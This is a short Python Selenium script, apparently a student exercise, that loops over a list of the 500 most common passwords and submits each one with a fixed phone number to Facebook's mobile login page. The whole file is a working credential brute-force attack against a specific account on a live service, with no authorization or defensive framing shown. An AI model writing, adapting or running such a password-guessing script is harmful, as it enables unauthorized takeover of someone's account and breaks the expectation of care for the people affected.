from selenium.webdriver.common.keys import Keys
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import time

lines = []
with open('C:\\Users\\rs561\\Desktop\\PCPS_College\\Python_Advance\\WebScraping\\brute_force_on_gmail\\SecLists\\Passwords\\Common-Credentials\\500-worst-passwords.txt', 'r', encoding='utf-8') as file:
    lines = [line.strip() for line in file]
    # Rest of your code here


print(lines)
email = '9819717983'

for i in lines:
    s = Service(
        "C:/Users/rs561/Desktop/PCPS_College/Python_Advance/WebScraping/chromedriver-win64/chromedriver.exe")
    driver = webdriver.Chrome(service=s)

    driver.get("https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2Fhome.php&refsrc=deprecated&_rdr")
    phone = driver.find_element_by_xpath(
        """/html/body/div/div/div[2]/div/table/tbody/tr/td/div[3]/div/div[2]/form/ul/li[1]/input""")
    time.sleep(1)

    phone.send_keys(email)
    password = driver.find_element_by_xpath(
        """/html/body/div/div/div[2]/div/table/tbody/tr/td/div[3]/div/div[2]/form/ul/li[2]/section/input""")
    password.send_keys(i)
    driver.find_element_by_xpath(
        """/html/body/div/div/div[2]/div/table/tbody/tr/td/div[3]/div/div[2]/form/ul/li[3]/input""").click()
    time.sleep(5)
